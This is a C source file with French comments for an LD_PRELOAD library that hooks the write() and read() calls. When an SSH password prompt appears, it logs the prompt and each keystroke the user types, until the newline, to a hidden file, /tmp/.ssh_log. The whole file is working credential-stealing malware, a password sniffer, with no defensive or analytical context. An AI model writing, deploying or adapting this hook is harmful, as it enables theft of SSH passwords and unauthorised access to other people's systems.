#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>

static ssize_t (*real_write)(int fd, const void *buf, size_t count) = NULL;
static ssize_t (*real_read)(int fd, void *buf, size_t count) = NULL;

static int capturing = 0;  // 1 = capture active, 0 = capture désactivée
static char ssh_user_prompt[256] = "";  // Stocke le prompt SSH (username@host)

void init() {
    if (!real_write) {
        real_write = dlsym(RTLD_NEXT, "write");
    }
    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
    }
}

// Hook de write()
ssize_t write(int fd, const void *buf, size_t count) {
    init();

    // Vérifie si le prompt SSH est affiché
    if (strstr(buf, "'s password:") != NULL) {
        capturing = 1;  // Activer la capture

        // Stocker le prompt complet pour le réutiliser lors de la capture du mot de passe
        snprintf(ssh_user_prompt, sizeof(ssh_user_prompt), "%.*s", (int)count, (char *)buf);

        FILE *logfile = fopen("/tmp/.ssh_log", "a");
        if (logfile) {
            fprintf(logfile, "[SSH] Login prompt detected: %s\n", ssh_user_prompt);
            fclose(logfile);
        }
    }

    return real_write(fd, buf, count);
}

// Hook de read()
ssize_t read(int fd, void *buf, size_t count) {
    init();
    
    ssize_t ret = real_read(fd, buf, count);  // Lire normalement les données

    if (capturing && ret > 0) {  // Si la capture est active et qu’on lit quelque chose
        FILE *logfile = fopen("/tmp/.ssh_log", "a");
        if (logfile) {
            fprintf(logfile, "[SSH] %s Captured password fragment: %.*s\n", ssh_user_prompt, (int)ret, (char *)buf);
            fclose(logfile);
        }

        if (memchr(buf, '\n', ret) != NULL) {  // Si un '\n' est détecté, arrêt de la capture
            capturing = 0;
            ssh_user_prompt[0] = '\0';  // Réinitialiser après capture du mot de passe
        }
    }

    return ret;
}